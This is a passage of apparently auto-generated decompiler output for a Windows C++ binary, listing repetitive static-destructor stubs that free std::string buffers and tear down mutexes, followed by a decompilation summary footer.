// 4FA5C8: using guessed type int dword_4FA5C8;
// 4FA5CC: using guessed type int dword_4FA5CC;

//----- (0048E4B0) --------------------------------------------------------
void __cdecl sub_48E4B0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA62C >= 0x10 )
  {
    v0 = dword_4FA618;
    if ( (unsigned int)(dword_4FA62C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA618 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA618 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA628 = 0;
  dword_4FA62C = 15;
  LOBYTE(dword_4FA618) = 0;
}
// 4FA628: using guessed type int dword_4FA628;
// 4FA62C: using guessed type int dword_4FA62C;

//----- (0048E510) --------------------------------------------------------
void __cdecl sub_48E510()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA9D4 >= 0x10 )
  {
    v0 = dword_4FA9C0;
    if ( (unsigned int)(dword_4FA9D4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA9C0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA9C0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA9D0 = 0;
  dword_4FA9D4 = 15;
  LOBYTE(dword_4FA9C0) = 0;
}
// 4FA9D0: using guessed type int dword_4FA9D0;
// 4FA9D4: using guessed type int dword_4FA9D4;

//----- (0048E570) --------------------------------------------------------
void __cdecl sub_48E570()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA9BC >= 0x10 )
  {
    v0 = dword_4FA9A8;
    if ( (unsigned int)(dword_4FA9BC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA9A8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA9A8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA9B8 = 0;
  dword_4FA9BC = 15;
  LOBYTE(dword_4FA9A8) = 0;
}
// 4FA9B8: using guessed type int dword_4FA9B8;
// 4FA9BC: using guessed type int dword_4FA9BC;

//----- (0048E5D0) --------------------------------------------------------
void __cdecl sub_48E5D0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA5FC >= 0x10 )
  {
    v0 = dword_4FA5E8;
    if ( (unsigned int)(dword_4FA5FC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA5E8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA5E8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA5F8 = 0;
  dword_4FA5FC = 15;
  LOBYTE(dword_4FA5E8) = 0;
}
// 4FA5F8: using guessed type int dword_4FA5F8;
// 4FA5FC: using guessed type int dword_4FA5FC;

//----- (0048E630) --------------------------------------------------------
void __cdecl sub_48E630()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA7C4 >= 0x10 )
  {
    v0 = dword_4FA7B0;
    if ( (unsigned int)(dword_4FA7C4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA7B0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA7B0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA7C0 = 0;
  dword_4FA7C4 = 15;
  LOBYTE(dword_4FA7B0) = 0;
}
// 4FA7C0: using guessed type int dword_4FA7C0;
// 4FA7C4: using guessed type int dword_4FA7C4;

//----- (0048E690) --------------------------------------------------------
void __cdecl sub_48E690()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA5E4 >= 0x10 )
  {
    v0 = dword_4FA5D0;
    if ( (unsigned int)(dword_4FA5E4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA5D0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA5D0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA5E0 = 0;
  dword_4FA5E4 = 15;
  LOBYTE(dword_4FA5D0) = 0;
}
// 4FA5E0: using guessed type int dword_4FA5E0;
// 4FA5E4: using guessed type int dword_4FA5E4;

//----- (0048E6F0) --------------------------------------------------------
void __cdecl sub_48E6F0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA95C >= 0x10 )
  {
    v0 = dword_4FA948;
    if ( (unsigned int)(dword_4FA95C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA948 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA948 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA958 = 0;
  dword_4FA95C = 15;
  LOBYTE(dword_4FA948) = 0;
}
// 4FA958: using guessed type int dword_4FA958;
// 4FA95C: using guessed type int dword_4FA95C;

//----- (0048E750) --------------------------------------------------------
void __cdecl sub_48E750()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA644 >= 0x10 )
  {
    v0 = dword_4FA630;
    if ( (unsigned int)(dword_4FA644 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA630 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA630 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA640 = 0;
  dword_4FA644 = 15;
  LOBYTE(dword_4FA630) = 0;
}
// 4FA640: using guessed type int dword_4FA640;
// 4FA644: using guessed type int dword_4FA644;

//----- (0048E7B0) --------------------------------------------------------
void __cdecl sub_48E7B0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA6BC >= 0x10 )
  {
    v0 = dword_4FA6A8;
    if ( (unsigned int)(dword_4FA6BC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA6A8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA6A8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA6B8 = 0;
  dword_4FA6BC = 15;
  LOBYTE(dword_4FA6A8) = 0;
}
// 4FA6B8: using guessed type int dword_4FA6B8;
// 4FA6BC: using guessed type int dword_4FA6BC;

//----- (0048E810) --------------------------------------------------------
void __cdecl sub_48E810()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA6EC >= 0x10 )
  {
    v0 = dword_4FA6D8;
    if ( (unsigned int)(dword_4FA6EC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA6D8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA6D8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA6E8 = 0;
  dword_4FA6EC = 15;
  LOBYTE(dword_4FA6D8) = 0;
}
// 4FA6E8: using guessed type int dword_4FA6E8;
// 4FA6EC: using guessed type int dword_4FA6EC;

//----- (0048E870) --------------------------------------------------------
void __cdecl sub_48E870()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA68C >= 0x10 )
  {
    v0 = dword_4FA678;
    if ( (unsigned int)(dword_4FA68C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA678 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA678 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA688 = 0;
  dword_4FA68C = 15;
  LOBYTE(dword_4FA678) = 0;
}
// 4FA688: using guessed type int dword_4FA688;
// 4FA68C: using guessed type int dword_4FA68C;

//----- (0048E8D0) --------------------------------------------------------
void __cdecl sub_48E8D0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA9EC >= 0x10 )
  {
    v0 = dword_4FA9D8;
    if ( (unsigned int)(dword_4FA9EC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA9D8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA9D8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA9E8 = 0;
  dword_4FA9EC = 15;
  LOBYTE(dword_4FA9D8) = 0;
}
// 4FA9E8: using guessed type int dword_4FA9E8;
// 4FA9EC: using guessed type int dword_4FA9EC;

//----- (0048E930) --------------------------------------------------------
void __cdecl sub_48E930()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA6D4 >= 0x10 )
  {
    v0 = dword_4FA6C0;
    if ( (unsigned int)(dword_4FA6D4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA6C0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA6C0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA6D0 = 0;
  dword_4FA6D4 = 15;
  LOBYTE(dword_4FA6C0) = 0;
}
// 4FA6D0: using guessed type int dword_4FA6D0;
// 4FA6D4: using guessed type int dword_4FA6D4;

//----- (0048E990) --------------------------------------------------------
void __cdecl sub_48E990()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA6A4 >= 0x10 )
  {
    v0 = dword_4FA690;
    if ( (unsigned int)(dword_4FA6A4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA690 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA690 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA6A0 = 0;
  dword_4FA6A4 = 15;
  LOBYTE(dword_4FA690) = 0;
}
// 4FA6A0: using guessed type int dword_4FA6A0;
// 4FA6A4: using guessed type int dword_4FA6A4;

//----- (0048E9F0) --------------------------------------------------------
void __cdecl sub_48E9F0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA5B4 >= 0x10 )
  {
    v0 = dword_4FA5A0;
    if ( (unsigned int)(dword_4FA5B4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA5A0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA5A0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA5B0 = 0;
  dword_4FA5B4 = 15;
  LOBYTE(dword_4FA5A0) = 0;
}
// 4FA5B0: using guessed type int dword_4FA5B0;
// 4FA5B4: using guessed type int dword_4FA5B4;

//----- (0048EA50) --------------------------------------------------------
void __cdecl sub_48EA50()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FAA1C >= 0x10 )
  {
    v0 = dword_4FAA08;
    if ( (unsigned int)(dword_4FAA1C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FAA08 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FAA08 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FAA18 = 0;
  dword_4FAA1C = 15;
  LOBYTE(dword_4FAA08) = 0;
}
// 4FAA18: using guessed type int dword_4FAA18;
// 4FAA1C: using guessed type int dword_4FAA1C;

//----- (0048EAB0) --------------------------------------------------------
void __cdecl sub_48EAB0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA884 >= 0x10 )
  {
    v0 = dword_4FA870;
    if ( (unsigned int)(dword_4FA884 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA870 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA870 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA880 = 0;
  dword_4FA884 = 15;
  LOBYTE(dword_4FA870) = 0;
}
// 4FA880: using guessed type int dword_4FA880;
// 4FA884: using guessed type int dword_4FA884;

//----- (0048EB10) --------------------------------------------------------
void __cdecl sub_48EB10()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA974 >= 0x10 )
  {
    v0 = dword_4FA960;
    if ( (unsigned int)(dword_4FA974 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA960 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA960 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA970 = 0;
  dword_4FA974 = 15;
  LOBYTE(dword_4FA960) = 0;
}
// 4FA970: using guessed type int dword_4FA970;
// 4FA974: using guessed type int dword_4FA974;

//----- (0048EB70) --------------------------------------------------------
void __cdecl sub_48EB70()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA80C >= 0x10 )
  {
    v0 = dword_4FA7F8;
    if ( (unsigned int)(dword_4FA80C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA7F8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA7F8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA808 = 0;
  dword_4FA80C = 15;
  LOBYTE(dword_4FA7F8) = 0;
}
// 4FA808: using guessed type int dword_4FA808;
// 4FA80C: using guessed type int dword_4FA80C;

//----- (0048EBD0) --------------------------------------------------------
void __cdecl sub_48EBD0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA8FC >= 0x10 )
  {
    v0 = dword_4FA8E8;
    if ( (unsigned int)(dword_4FA8FC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA8E8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA8E8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA8F8 = 0;
  dword_4FA8FC = 15;
  LOBYTE(dword_4FA8E8) = 0;
}
// 4FA8F8: using guessed type int dword_4FA8F8;
// 4FA8FC: using guessed type int dword_4FA8FC;

//----- (0048EC30) --------------------------------------------------------
void __cdecl sub_48EC30()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA734 >= 0x10 )
  {
    v0 = dword_4FA720;
    if ( (unsigned int)(dword_4FA734 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA720 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA720 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA730 = 0;
  dword_4FA734 = 15;
  LOBYTE(dword_4FA720) = 0;
}
// 4FA730: using guessed type int dword_4FA730;
// 4FA734: using guessed type int dword_4FA734;

//----- (0048EC90) --------------------------------------------------------
void __cdecl sub_48EC90()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA74C >= 0x10 )
  {
    v0 = dword_4FA738;
    if ( (unsigned int)(dword_4FA74C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA738 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA738 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA748 = 0;
  dword_4FA74C = 15;
  LOBYTE(dword_4FA738) = 0;
}
// 4FA748: using guessed type int dword_4FA748;
// 4FA74C: using guessed type int dword_4FA74C;

//----- (0048ECF0) --------------------------------------------------------
void __cdecl sub_48ECF0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA9A4 >= 0x10 )
  {
    v0 = dword_4FA990;
    if ( (unsigned int)(dword_4FA9A4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA990 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA990 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA9A0 = 0;
  dword_4FA9A4 = 15;
  LOBYTE(dword_4FA990) = 0;
}
// 4FA9A0: using guessed type int dword_4FA9A0;
// 4FA9A4: using guessed type int dword_4FA9A4;

//----- (0048ED50) --------------------------------------------------------
void __cdecl sub_48ED50()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA944 >= 0x10 )
  {
    v0 = dword_4FA930;
    if ( (unsigned int)(dword_4FA944 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA930 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA930 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA940 = 0;
  dword_4FA944 = 15;
  LOBYTE(dword_4FA930) = 0;
}
// 4FA940: using guessed type int dword_4FA940;
// 4FA944: using guessed type int dword_4FA944;

//----- (0048EDB0) --------------------------------------------------------
void __cdecl sub_48EDB0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA614 >= 0x10 )
  {
    v0 = dword_4FA600;
    if ( (unsigned int)(dword_4FA614 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA600 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA600 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA610 = 0;
  dword_4FA614 = 15;
  LOBYTE(dword_4FA600) = 0;
}
// 4FA610: using guessed type int dword_4FA610;
// 4FA614: using guessed type int dword_4FA614;

//----- (0048EE10) --------------------------------------------------------
void __cdecl sub_48EE10()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA86C >= 0x10 )
  {
    v0 = dword_4FA858;
    if ( (unsigned int)(dword_4FA86C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA858 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA858 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA868 = 0;
  dword_4FA86C = 15;
  LOBYTE(dword_4FA858) = 0;
}
// 4FA868: using guessed type int dword_4FA868;
// 4FA86C: using guessed type int dword_4FA86C;

//----- (0048EE70) --------------------------------------------------------
void __cdecl sub_48EE70()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA824 >= 0x10 )
  {
    v0 = dword_4FA810;
    if ( (unsigned int)(dword_4FA824 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA810 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA810 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA820 = 0;
  dword_4FA824 = 15;
  LOBYTE(dword_4FA810) = 0;
}
// 4FA820: using guessed type int dword_4FA820;
// 4FA824: using guessed type int dword_4FA824;

//----- (0048EEC6) --------------------------------------------------------
void __cdecl sub_48EEC6()
{
  _Cnd_destroy_in_situ((_Cnd_t)&unk_4FF758);
}

//----- (0048EED2) --------------------------------------------------------
void __cdecl sub_48EED2()
{
  _Mtx_destroy_in_situ((_Mtx_t)&unk_4FF724);
}

//----- (0048EF3C) --------------------------------------------------------
void __cdecl sub_48EF3C()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_4F8000, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_4FF938;
    do
      _Mtxdst(v0++);
    while ( v0 != (struct _RTL_CRITICAL_SECTION *)&unk_4FF9F8 );
  }
}
// 4F8000: using guessed type int dword_4F8000;

//----- (0048EF46) --------------------------------------------------------
void __cdecl sub_48EF46()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_4F8000, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_4FF938;
    do
      _Mtxdst(v0++);
    while ( v0 != (struct _RTL_CRITICAL_SECTION *)&unk_4FF9F8 );
  }
}
// 4F8000: using guessed type int dword_4F8000;

//----- (0048EF50) --------------------------------------------------------
void __cdecl sub_48EF50()
{
  std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t((std::_Fac_tidy_reg_t *)&unk_490840);
}

//----- (0048EF5A) --------------------------------------------------------
void __cdecl sub_48EF5A()
{
  sub_42DEE0(&dword_4FFA38);
}
// 4FFA38: using guessed type _DWORD dword_4FFA38;

//----- (0048EF64) --------------------------------------------------------
void __cdecl sub_48EF64()
{
  _Init_atexit::~_Init_atexit((_Init_atexit *)&unk_4FFC11);
}

//----- (0048EF6E) --------------------------------------------------------
void __cdecl sub_48EF6E()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_4F8000, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_4FF938;
    do
      _Mtxdst(v0++);
    while ( v0 != (struct _RTL_CRITICAL_SECTION *)&unk_4FF9F8 );
  }
}
// 4F8000: using guessed type int dword_4F8000;

//----- (0048EF80) --------------------------------------------------------
void __cdecl sub_48EF80()
{
  VariantClear(&pvarg);
}

//----- (0048EF8C) --------------------------------------------------------
void __cdecl sub_48EF8C()
{
  void *v0; // esi

  v0 = dword_4FFFE0;
  if ( dword_4FFFE0 )
  {
    sub_44A57F((char *)dword_4FFFE0);
    sub_44775B(v0);
    dword_4FFFE0 = 0;
  }
}

// nfuncs=3885 queued=2571 decompiled=2571 lumina nreq=0 worse=0 better=0
#error "There were 2 decompilation failure(s) on 2571 function(s)"
